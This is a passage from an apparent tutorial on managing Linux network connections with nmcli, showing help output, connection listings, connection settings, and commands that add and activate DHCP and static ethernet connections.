</span><span class='line'>IP6.ADDRESS[1]:                         fe80::d7e8:7b48:831f:a1de/64
</span><span class='line'>IP6.GATEWAY:                            </span></code></pre></td></tr></table></div></figure>


<h2>Connection options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con help
</span><span class='line'>Usage: nmcli connection { COMMAND | help }
</span><span class='line'>
</span><span class='line'>COMMAND := { show | up | down | add | modify | clone | edit | delete | monitor | reload | load | import | export }
</span><span class='line'>
</span><span class='line'>  show [--active] [--order &lt;order spec&gt;]
</span><span class='line'>  show [--active] [id | uuid | path | apath] &lt;ID&gt; ...
</span><span class='line'>
</span><span class='line'>  up [[id | uuid | path] &lt;ID&gt;] [ifname &lt;ifname&gt;] [ap &lt;BSSID&gt;] [passwd-file &lt;file with passwords&gt;]
</span><span class='line'>
</span><span class='line'>  down [id | uuid | path | apath] &lt;ID&gt; ...
</span><span class='line'>
</span><span class='line'>  add COMMON_OPTIONS TYPE_SPECIFIC_OPTIONS SLAVE_OPTIONS IP_OPTIONS [-- ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+]
</span><span class='line'>
</span><span class='line'>  modify [--temporary] [id | uuid | path] &lt;ID&gt; ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+
</span><span class='line'>
</span><span class='line'>  clone [--temporary] [id | uuid | path ] &lt;ID&gt; &lt;new name&gt;
</span><span class='line'>
</span><span class='line'>  edit [id | uuid | path] &lt;ID&gt;
</span><span class='line'>  edit [type &lt;new_con_type&gt;] [con-name &lt;new_con_name&gt;]
</span><span class='line'>
</span><span class='line'>  delete [id | uuid | path] &lt;ID&gt;
</span><span class='line'>
</span><span class='line'>  monitor [id | uuid | path] &lt;ID&gt; ...
</span><span class='line'>
</span><span class='line'>  reload
</span><span class='line'>
</span><span class='line'>  load &lt;filename&gt; [ &lt;filename&gt;... ]
</span><span class='line'>
</span><span class='line'>  import [--temporary] type &lt;type&gt; file &lt;file to import&gt;
</span><span class='line'>
</span><span class='line'>  export [id | uuid | path] &lt;ID&gt; [&lt;output file&gt;] </span></code></pre></td></tr></table></div></figure>


<ul>
<li>look at the available connections and list only the active ones</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con show
</span><span class='line'>NAME                UUID                                  TYPE            DEVICE 
</span><span class='line'>Wired connection 1  8d922966-5be4-4633-a99d-71e836e2b31a  802-3-ethernet  enp0s3 
</span><span class='line'>virbr0              321062a9-495a-4095-b4b5-d1af9c0cc65c  bridge          virbr0 
</span><span class='line'>enp0s3              b4c32cc7-c5ff-451c-8af2-9b9124050f99  802-3-ethernet  --  
</span><span class='line'>nmcli con show --active
</span><span class='line'>NAME                UUID                                  TYPE            DEVICE 
</span><span class='line'>Wired connection 1  8d922966-5be4-4633-a99d-71e836e2b31a  802-3-ethernet  enp0s3 
</span><span class='line'>virbr0              321062a9-495a-4095-b4b5-d1af9c0cc65c  bridge          virbr0 </span></code></pre></td></tr></table></div></figure>


<ul>
<li>list the settings of a particular connection (the double quotes aren&rsquo;t mandatory)</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con show "Wired connection 1" 
</span><span class='line'>connection.id:                          Wired connection 1
</span><span class='line'>connection.uuid:                        8d922966-5be4-4633-a99d-71e836e2b31a
</span><span class='line'>connection.stable-id:                   --
</span><span class='line'>connection.interface-name:              --
</span><span class='line'>connection.type:                        802-3-ethernet
</span><span class='line'>connection.autoconnect:                 yes
</span><span class='line'>connection.autoconnect-priority:        0
</span><span class='line'>connection.timestamp:                   1515583502
</span><span class='line'>connection.read-only:                   no
</span><span class='line'>connection.permissions:                 
</span><span class='line'>connection.zone:                        --
</span><span class='line'>connection.master:                      --
</span><span class='line'>connection.slave-type:                  --
</span><span class='line'>connection.autoconnect-slaves:          -1 (default)
</span><span class='line'>connection.secondaries:                 
</span><span class='line'>connection.gateway-ping-timeout:        0
</span><span class='line'>connection.metered:                     unknown
</span><span class='line'>connection.lldp:                        -1 (default)
</span><span class='line'>802-3-ethernet.port:                    --
</span><span class='line'>802-3-ethernet.speed:                   0
</span><span class='line'>802-3-ethernet.duplex:                  --
</span><span class='line'>802-3-ethernet.auto-negotiate:          yes
</span><span class='line'>802-3-ethernet.mac-address:             00:0C:29:47:D7:A8
</span><span class='line'>802-3-ethernet.cloned-mac-address:      --
</span><span class='line'>802-3-ethernet.generate-mac-address-mask:--
</span><span class='line'>802-3-ethernet.mac-address-blacklist:   
</span><span class='line'>802-3-ethernet.mtu:                     auto
</span><span class='line'>802-3-ethernet.s390-subchannels:        
</span><span class='line'>802-3-ethernet.s390-nettype:            --
</span><span class='line'>802-3-ethernet.s390-options:            
</span><span class='line'>802-3-ethernet.wake-on-lan:             1 (default)
</span><span class='line'>802-3-ethernet.wake-on-lan-password:    --
</span><span class='line'>ipv4.method:                            auto
</span><span class='line'>ipv4.dns:                               8.8.8.8
</span><span class='line'>ipv4.dns-search:                        
</span><span class='line'>ipv4.dns-options:                       (default)
</span><span class='line'>ipv4.dns-priority:                      0
</span><span class='line'>ipv4.addresses:                         
</span><span class='line'>ipv4.gateway:                           --
</span><span class='line'>ipv4.routes:                            
</span><span class='line'>ipv4.route-metric:                      -1
</span><span class='line'>ipv4.ignore-auto-routes:                no
</span><span class='line'>ipv4.ignore-auto-dns:                   no
</span><span class='line'>ipv4.dhcp-client-id:                    --
</span><span class='line'>ipv4.dhcp-timeout:                      0
</span><span class='line'>ipv4.dhcp-send-hostname:                yes
</span><span class='line'>ipv4.dhcp-hostname:                     --
</span><span class='line'>ipv4.dhcp-fqdn:                         --
</span><span class='line'>ipv4.never-default:                     no
</span><span class='line'>ipv4.may-fail:                          yes
</span><span class='line'>ipv4.dad-timeout:                       -1 (default)
</span><span class='line'>ipv6.method:                            auto
</span><span class='line'>ipv6.dns:                               
</span><span class='line'>ipv6.dns-search:                        
</span><span class='line'>ipv6.dns-options:                       (default)
</span><span class='line'>ipv6.dns-priority:                      0
</span><span class='line'>ipv6.addresses:                         
</span><span class='line'>ipv6.gateway:                           --
</span><span class='line'>ipv6.routes:                            
</span><span class='line'>ipv6.route-metric:                      -1
</span><span class='line'>ipv6.ignore-auto-routes:                no
</span><span class='line'>ipv6.ignore-auto-dns:                   no
</span><span class='line'>ipv6.never-default:                     no
</span><span class='line'>ipv6.may-fail:                          yes
</span><span class='line'>ipv6.ip6-privacy:                       -1 (unknown)
</span><span class='line'>ipv6.addr-gen-mode:                     stable-privacy
</span><span class='line'>ipv6.dhcp-send-hostname:                yes
</span><span class='line'>ipv6.dhcp-hostname:                     --
</span><span class='line'>ipv6.token:                             --
</span><span class='line'>GENERAL.NAME:                           Wired connection 1
</span><span class='line'>GENERAL.UUID:                           8d922966-5be4-4633-a99d-71e836e2b31a
</span><span class='line'>GENERAL.DEVICES:                        enp0s3
</span><span class='line'>GENERAL.STATE:                          activated
</span><span class='line'>GENERAL.DEFAULT:                        yes
</span><span class='line'>GENERAL.DEFAULT6:                       no
</span><span class='line'>GENERAL.VPN:                            no
</span><span class='line'>GENERAL.ZONE:                           --
</span><span class='line'>GENERAL.DBUS-PATH:                      /org/freedesktop/NetworkManager/ActiveConnection/0
</span><span class='line'>GENERAL.CON-PATH:                       /org/freedesktop/NetworkManager/Settings/0
</span><span class='line'>GENERAL.SPEC-OBJECT:                    /
</span><span class='line'>GENERAL.MASTER-PATH:                    --
</span><span class='line'>IP4.ADDRESS[1]:                         192.168.241.130/24
</span><span class='line'>IP4.GATEWAY:                            192.168.241.2
</span><span class='line'>IP4.DNS[1]:                             192.168.241.2
</span><span class='line'>IP4.DNS[2]:                             8.8.8.8
</span><span class='line'>IP4.DOMAIN[1]:                          localdomain
</span><span class='line'>DHCP4.OPTION[1]:                        requested_routers = 1
</span><span class='line'>DHCP4.OPTION[2]:                        requested_domain_search = 1
</span><span class='line'>DHCP4.OPTION[3]:                        requested_time_offset = 1
</span><span class='line'>DHCP4.OPTION[4]:                        requested_domain_name = 1
</span><span class='line'>DHCP4.OPTION[5]:                        requested_rfc3442_classless_static_routes = 1
</span><span class='line'>DHCP4.OPTION[6]:                        requested_classless_static_routes = 1
</span><span class='line'>DHCP4.OPTION[7]:                        requested_wpad = 1
</span><span class='line'>DHCP4.OPTION[8]:                        requested_broadcast_address = 1
</span><span class='line'>DHCP4.OPTION[9]:                        next_server = 192.168.241.254
</span><span class='line'>DHCP4.OPTION[10]:                       expiry = 1515584826
</span><span class='line'>DHCP4.OPTION[11]:                       requested_interface_mtu = 1
</span><span class='line'>DHCP4.OPTION[12]:                       requested_subnet_mask = 1
</span><span class='line'>DHCP4.OPTION[13]:                       domain_name = localdomain
</span><span class='line'>DHCP4.OPTION[14]:                       dhcp_message_type = 5
</span><span class='line'>DHCP4.OPTION[15]:                       ip_address = 192.168.241.130
</span><span class='line'>DHCP4.OPTION[16]:                       routers = 192.168.241.2
</span><span class='line'>DHCP4.OPTION[17]:                       requested_static_routes = 1
</span><span class='line'>DHCP4.OPTION[18]:                       subnet_mask = 255.255.255.0
</span><span class='line'>DHCP4.OPTION[19]:                       requested_domain_name_servers = 1
</span><span class='line'>DHCP4.OPTION[20]:                       requested_nis_servers = 1
</span><span class='line'>DHCP4.OPTION[21]:                       requested_ntp_servers = 1
</span><span class='line'>DHCP4.OPTION[22]:                       domain_name_servers = 192.168.241.2
</span><span class='line'>DHCP4.OPTION[23]:                       dhcp_lease_time = 1800
</span><span class='line'>DHCP4.OPTION[24]:                       requested_ms_classless_static_routes = 1
</span><span class='line'>DHCP4.OPTION[25]:                       broadcast_address = 192.168.241.255
</span><span class='line'>DHCP4.OPTION[26]:                       requested_nis_domain = 1
</span><span class='line'>DHCP4.OPTION[27]:                       network_number = 192.168.241.0
</span><span class='line'>DHCP4.OPTION[28]:                       requested_host_name = 1
</span><span class='line'>DHCP4.OPTION[29]:                       dhcp_server_identifier = 192.168.241.254
</span><span class='line'>IP6.ADDRESS[1]:                         fe80::d7e8:7b48:831f:a1de/64
</span><span class='line'>IP6.GATEWAY:                            </span></code></pre></td></tr></table></div></figure>


<ul>
<li>adding connections</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con add help
</span><span class='line'>Usage: nmcli connection add { ARGUMENTS | help }
</span><span class='line'>
</span><span class='line'>ARGUMENTS := COMMON_OPTIONS TYPE_SPECIFIC_OPTIONS SLAVE_OPTIONS IP_OPTIONS [-- ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+]
</span><span class='line'>
</span><span class='line'>  COMMON_OPTIONS:
</span><span class='line'>                  type &lt;type&gt;
</span><span class='line'>                  ifname &lt;interface name&gt; | "*"
</span><span class='line'>                  [con-name &lt;connection name&gt;]
</span><span class='line'>                  [autoconnect yes|no]
</span><span class='line'>                  [save yes|no]
</span><span class='line'>                  [master &lt;master (ifname, or connection UUID or name)&gt;]
</span><span class='line'>                  [slave-type &lt;master connection type&gt;]
</span><span class='line'>
</span><span class='line'>  TYPE_SPECIFIC_OPTIONS:
</span><span class='line'>    ethernet:     [mac &lt;MAC address&gt;]
</span><span class='line'>                  [cloned-mac &lt;cloned MAC address&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>
</span><span class='line'>    wifi:         ssid &lt;SSID&gt;
</span><span class='line'>                  [mac &lt;MAC address&gt;]
</span><span class='line'>                  [cloned-mac &lt;cloned MAC address&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>                  [mode infrastructure|ap|adhoc]
</span><span class='line'>
</span><span class='line'>    wimax:        [mac &lt;MAC address&gt;]
</span><span class='line'>                  [nsp &lt;NSP&gt;]
</span><span class='line'>
</span><span class='line'>    pppoe:        username &lt;PPPoE username&gt;
</span><span class='line'>                  [password &lt;PPPoE password&gt;]
</span><span class='line'>                  [service &lt;PPPoE service name&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>                  [mac &lt;MAC address&gt;]
</span><span class='line'>
</span><span class='line'>    gsm:          apn &lt;APN&gt;
</span><span class='line'>                  [user &lt;username&gt;]
</span><span class='line'>                  [password &lt;password&gt;]
</span><span class='line'>
</span><span class='line'>    cdma:         [user &lt;username&gt;]
</span><span class='line'>                  [password &lt;password&gt;]
</span><span class='line'>
</span><span class='line'>    infiniband:   [mac &lt;MAC address&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>                  [transport-mode datagram | connected]
</span><span class='line'>                  [parent &lt;ifname&gt;]
</span><span class='line'>                  [p-key &lt;IPoIB P_Key&gt;]
</span><span class='line'>
</span><span class='line'>    bluetooth:    [addr &lt;bluetooth address&gt;]
</span><span class='line'>                  [bt-type panu|dun-gsm|dun-cdma]
</span><span class='line'>
</span><span class='line'>    vlan:         dev &lt;parent device (connection UUID, ifname, or MAC)&gt;
</span><span class='line'>                  id &lt;VLAN ID&gt;
</span><span class='line'>                  [flags &lt;VLAN flags&gt;]
</span><span class='line'>                  [ingress &lt;ingress priority mapping&gt;]
</span><span class='line'>                  [egress &lt;egress priority mapping&gt;]
</span><span class='line'>                  [mtu &lt;MTU&gt;]
</span><span class='line'>
</span><span class='line'>    bond:         [mode balance-rr (0) | active-backup (1) | balance-xor (2) | broadcast (3) |
</span><span class='line'>                        802.3ad    (4) | balance-tlb   (5) | balance-alb (6)]
</span><span class='line'>                  [primary &lt;ifname&gt;]
</span><span class='line'>                  [miimon &lt;num&gt;]
</span><span class='line'>                  [downdelay &lt;num&gt;]
</span><span class='line'>                  [updelay &lt;num&gt;]
</span><span class='line'>                  [arp-interval &lt;num&gt;]
</span><span class='line'>                  [arp-ip-target &lt;num&gt;]
</span><span class='line'>                  [lacp-rate slow (0) | fast (1)]
</span><span class='line'>
</span><span class='line'>    bond-slave:   master &lt;master (ifname, or connection UUID or name)&gt;
</span><span class='line'>
</span><span class='line'>    team:         [config &lt;file&gt;|&lt;raw JSON data&gt;]
</span><span class='line'>
</span><span class='line'>    team-slave:   master &lt;master (ifname, or connection UUID or name)&gt;
</span><span class='line'>                  [config &lt;file&gt;|&lt;raw JSON data&gt;]
</span><span class='line'>
</span><span class='line'>    bridge:       [stp yes|no]
</span><span class='line'>                  [priority &lt;num&gt;]
</span><span class='line'>                  [forward-delay &lt;2-30&gt;]
</span><span class='line'>                  [hello-time &lt;1-10&gt;]
</span><span class='line'>                  [max-age &lt;6-40&gt;]
</span><span class='line'>                  [ageing-time &lt;0-1000000&gt;]
</span><span class='line'>                  [multicast-snooping yes|no]
</span><span class='line'>                  [mac &lt;MAC address&gt;]
</span><span class='line'>
</span><span class='line'>    bridge-slave: master &lt;master (ifname, or connection UUID or name)&gt;
</span><span class='line'>                  [priority &lt;0-63&gt;]
</span><span class='line'>                  [path-cost &lt;1-65535&gt;]
</span><span class='line'>                  [hairpin yes|no]
</span><span class='line'>
</span><span class='line'>    vpn:          vpn-type vpnc|openvpn|pptp|openconnect|openswan|libreswan|ssh|l2tp|iodine|...
</span><span class='line'>                  [user &lt;username&gt;]
</span><span class='line'>
</span><span class='line'>    olpc-mesh:    ssid &lt;SSID&gt;
</span><span class='line'>                  [channel &lt;1-13&gt;]
</span><span class='line'>                  [dhcp-anycast &lt;MAC address&gt;]
</span><span class='line'>
</span><span class='line'>    adsl:         username &lt;username&gt;
</span><span class='line'>                  protocol pppoa|pppoe|ipoatm
</span><span class='line'>                  [password &lt;password&gt;]
</span><span class='line'>                  [encapsulation vcmux|llc]
</span><span class='line'>
</span><span class='line'>    tun:          mode tun|tap
</span><span class='line'>                  [owner &lt;UID&gt;]
</span><span class='line'>                  [group &lt;GID&gt;]
</span><span class='line'>                  [pi yes|no]
</span><span class='line'>                  [vnet-hdr yes|no]
</span><span class='line'>                  [multi-queue yes|no]
</span><span class='line'>
</span><span class='line'>    ip-tunnel:    mode ipip|gre|sit|isatap|vti|ip6ip6|ipip6|ip6gre|vti6
</span><span class='line'>                  remote &lt;remote endpoint IP&gt;
</span><span class='line'>                  [local &lt;local endpoint IP&gt;]
</span><span class='line'>                  [dev &lt;parent device (ifname or connection UUID)&gt;]
</span><span class='line'>
</span><span class='line'>    macvlan:      dev &lt;parent device (connection UUID, ifname, or MAC)&gt;
</span><span class='line'>                  mode vepa|bridge|private|passthru|source
</span><span class='line'>                  [tap yes|no]
</span><span class='line'>
</span><span class='line'>    vxlan:        id &lt;VXLAN ID&gt;
</span><span class='line'>                  remote &lt;IP of multicast group or remote address&gt;
</span><span class='line'>                  [local &lt;source IP&gt;]
</span><span class='line'>                  [dev &lt;parent device (ifname or connection UUID)&gt;]
</span><span class='line'>                  [source-port-min &lt;0-65535&gt;]
</span><span class='line'>                  [source-port-max &lt;0-65535&gt;]
</span><span class='line'>                  [destination-port &lt;0-65535&gt;]
</span><span class='line'>
</span><span class='line'>  SLAVE_OPTIONS:
</span><span class='line'>    bridge:       [priority &lt;0-63&gt;]
</span><span class='line'>                  [path-cost &lt;1-65535&gt;]
</span><span class='line'>                  [hairpin yes|no]
</span><span class='line'>
</span><span class='line'>    team:         [config &lt;file&gt;|&lt;raw JSON data&gt;]
</span><span class='line'>
</span><span class='line'>  IP_OPTIONS:
</span><span class='line'>                  [ip4 &lt;IPv4 address&gt;] [gw4 &lt;IPv4 gateway&gt;]
</span><span class='line'>                  [ip6 &lt;IPv6 address&gt;] [gw6 &lt;IPv6 gateway&gt;]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add a new DHCP connection that will start on boot</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con add con-name newdhcp type ethernet ifname enp0s3 
</span><span class='line'>Connection 'newdhcp' (8c90fcd7-5e40-43c6-819b-47cab3051b5e) successfully added.
</span><span class='line'>nmcli con up newdhcp 
</span><span class='line'>Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/3)
</span><span class='line'>nmcli con show --active 
</span><span class='line'>NAME     UUID                                  TYPE            DEVICE 
</span><span class='line'>newdhcp  8c90fcd7-5e40-43c6-819b-47cab3051b5e  802-3-ethernet  enp0s3 
</span><span class='line'>virbr0   321062a9-495a-4095-b4b5-d1af9c0cc65c  bridge          virbr0</span></code></pre></td></tr></table></div></figure>


<ul>
<li>add a static connection</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con add con-name static-con ifname enp0s3 autoconnect no type ethernet ip4 192.168.241.120/24 gw4 192.168.241.2
</span><span class='line'>Connection 'static-con' (258c2964-ac43-4ed8-bffa-7ad09967b748) successfully added.</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see the IP we started with:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ifconfig | grep inet
</span><span class='line'>        inet 192.168.241.130  netmask 255.255.255.0  broadcast 192.168.241.255</span></code></pre></td></tr></table></div></figure>


<p>And after switching to the static connection:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con up static-con 
</span><span class='line'>Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/4)
</span><span class='line'>nmcli con show --active 
</span><span class='line'>NAME        UUID                                  TYPE            DEVICE 
</span><span class='line'>static-con  258c2964-ac43-4ed8-bffa-7ad09967b748  802-3-ethernet  enp0s3 
</span><span class='line'>virbr0      321062a9-495a-4095-b4b5-d1af9c0cc65c  bridge          virbr0 
</span><span class='line'>ifconfig | grep inet
</span><span class='line'>        inet 192.168.241.120  netmask 255.255.255.0  broadcast 192.168.241.255</span></code></pre></td></tr></table></div></figure>


<ul>
<li>modifying connections</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli con mod help
</span><span class='line'>Usage: nmcli connection modify { ARGUMENTS | help }
</span><span class='line'>
